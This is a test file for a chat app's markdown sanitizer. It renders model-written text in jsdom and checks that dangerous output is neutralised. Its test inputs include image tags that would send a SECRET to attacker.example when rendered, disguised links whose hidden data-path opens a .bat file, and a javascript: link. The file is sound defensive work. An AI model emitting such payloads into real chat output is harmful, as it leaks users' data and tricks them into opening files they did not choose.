// What model text can do once it is rendered.
//   Raw HTML `<a class="auto-path" data-path="x.bat">README.md</a>` survived sanitizing, so a
//       link could show one file and open another. Now only the app's own path links count,
//       and a link always shows the path it opens; new-tab links get noopener.
//   `<img src="//attacker/p?d=SECRET">` loaded on render. Now only this app's images or
//       inline data load (plus the page CSP, checked in the built index.html).
// Runs the real markdown step and the chat bubble's DOMPurify config in a jsdom window.
//
//   npx tsx client/test/sanitize.test.ts

import fs from 'fs'
import path from 'path'
import { createRequire } from 'module'

const require = createRequire(import.meta.url)
let JSDOM: typeof import('jsdom').JSDOM
try {
  JSDOM = require('jsdom').JSDOM
} catch {
  // Local runs from a worktree with no node_modules of its own can point at a scratch install.
  JSDOM = createRequire(path.join(process.env.ORC_TEST_MODULES ?? '', 'x.js'))('jsdom').JSDOM
}
const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'http://localhost:5174/' })
const g = globalThis as unknown as Record<string, unknown>
g.window = dom.window
g.document = dom.window.document
g.Element = dom.window.Element
g.Node = dom.window.Node

let failed = 0
let passed = 0
function check(name: string, ok: boolean, detail = ''): void {
  if (ok) passed++
  else failed++
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  ${detail}` : ''}`)
}

const DOMPurify = (await import('dompurify')).default
let hooks = false
try {
  const mod = await import('../src/utils/sanitize.js')
  mod.installSanitizerHooks()
  hooks = true
} catch (err) {
  console.log(`NOTE  utils/sanitize could not be loaded: ${(err as Error).message.split('\n')[0]}`)
}
const { parseMarkdown } = await import('../src/utils/markdown.js')

// The chat bubble's own config (MessageBubble.tsx renderContentHtml).
const render = (text: string): HTMLElement => {
  const html = DOMPurify.sanitize(parseMarkdown(text, { linkPaths: true }), {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'b', 'i', 'u', 's', 'del', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'hr', 'div', 'span', 'sup', 'sub'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target', 'rel', 'data-path', 'data-path-alt'],
  })
  const holder = dom.window.document.createElement('div')
  holder.innerHTML = html
  return holder
}

// ── links ─────────────────────────────────────────────────────────────────────────────────
const disguised = render('See <a class="auto-path" data-path="C:\\proj\\x.bat" href="#">README.md</a> for details.')
const fake = disguised.querySelector('a')
check('a model-written path link loses its hidden target (was data-path="C:\\proj\\x.bat")', !!fake && !fake.hasAttribute('data-path') && !fake.classList.contains('auto-path'), fake?.outerHTML)
const alt = render('<a class="auto-path" data-path="C:\\ok.md" data-path-alt="C:\\evil.bat" href="#">ok</a>').querySelector('a')
check('... including the fallback target', !!alt && !alt.hasAttribute('data-path-alt'), alt?.outerHTML)
const span = render('<span class="auto-path" data-path="C:\\x.bat">click</span>').querySelector('span')
check('data-path never survives on any other element', !span?.hasAttribute('data-path'), span?.outerHTML)
const forgedMarker = render('<a class="auto-path" data-orc-link="guess" data-path="C:\\x.bat" href="#">README.md</a>').querySelector('a')
check('a guessed marker does not make a link real', !!forgedMarker && !forgedMarker.hasAttribute('data-path'), forgedMarker?.outerHTML)

const real = render('The file is D:\\Work\\app\\notes.md, have a look.').querySelector('a.auto-path')
check('a path the model mentions is still a working link', !!real && real.getAttribute('data-path') === 'D:\\Work\\app\\notes.md', real?.outerHTML)
check('... showing the path it opens', !!real && real.textContent === 'D:\\Work\\app\\notes.md' && !real.hasAttribute('data-orc-link'))
const labelled = render('[the readme](D:\\Work\\app\\run.bat)').querySelector('a.auto-path')
check('a markdown label cannot hide the real path', !!labelled && (labelled.textContent ?? '').includes('D:\\Work\\app\\run.bat'), labelled?.outerHTML)

const blank = render('<a href="https://example.com" target="_blank" rel="opener">x</a>').querySelector('a')
check('a new-tab link never keeps rel=opener', blank?.getAttribute('rel') === 'noopener noreferrer', blank?.outerHTML)
const js = render('<a href="javascript:alert(1)">x</a>').querySelector('a')
check('a javascript: link goes nowhere', !js?.getAttribute('href')?.startsWith('javascript'), js?.outerHTML)

// Plan cards and task descriptions share the hooks.
const plan = DOMPurify.sanitize(parseMarkdown('[docs](https://example.com)'), { ALLOWED_TAGS: ['p', 'a'], ALLOWED_ATTR: ['href', 'title', 'class', 'target', 'rel'] })
check('a link in a plan card opens in a new tab instead of navigating the app away', /target="_blank"/.test(plan) && /noopener/.test(plan), plan)

// ── images ─────────────────────────────────────────────────────────────────────────────────
const leak = render('<img src="//attacker.example/p?d=SECRET">').querySelector('img')
check('a protocol-relative remote image does not load (was kept)', !!leak && !leak.getAttribute('src'), leak?.outerHTML)
const leak2 = render('<img src="https://attacker.example/p.png?d=SECRET">').querySelector('img')
check('an https remote image does not load', !!leak2 && !leak2.getAttribute('src'), leak2?.outerHTML)
const slash = render('<img src="/\\attacker.example/p.png?d=SECRET">').querySelector('img')
check('a "/\\host" image (read as //host by the browser) does not load', !!slash && !slash.getAttribute('src'), slash?.outerHTML)
const md = render('![x](https://attacker.example/p.png?d=SECRET)').querySelector('img')
check('a markdown remote image does not load', !md || !md.getAttribute('src'), md?.outerHTML)
const inline = render('<img src="data:image/png;base64,iVBORw0KGgo=">').querySelector('img')
check('an inline data image still shows', inline?.getAttribute('src')?.startsWith('data:image/png') === true)
const own = render('<img src="/logo.png">').querySelector('img')
check('an image from the app itself still shows', own?.getAttribute('src') === '/logo.png')

// The shipped page carries a CSP that says the same thing, as a second layer.
const viteConfig = fs.readFileSync(path.join(path.dirname(new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1')), '..', 'vite.config.ts'), 'utf8')
check('the page Content-Security-Policy limits images to this app and inline data', /img-src 'self' data: blob:/.test(viteConfig) && /Content-Security-Policy/.test(viteConfig))
const builtIndex = path.join(path.dirname(new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1')), '..', 'dist', 'index.html')
if (fs.existsSync(builtIndex)) {
  const html = fs.readFileSync(builtIndex, 'utf8')
  const csp = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)?.[1]?.replace(/&#39;/g, "'") ?? ''
  check('the BUILT page carries the CSP, with no inline-script allowance', /img-src 'self' data: blob:/.test(csp) && /script-src 'self'(;|$)/.test(csp) && !/unsafe-inline'[^;]*;?\s*style/.test(csp.split('script-src')[1]?.split(';')[0] ?? ''), csp)
}
check('hooks installed', hooks)

console.log(`\n${passed} passed, ${failed} failed`)
if (failed > 0) process.exitCode = 1
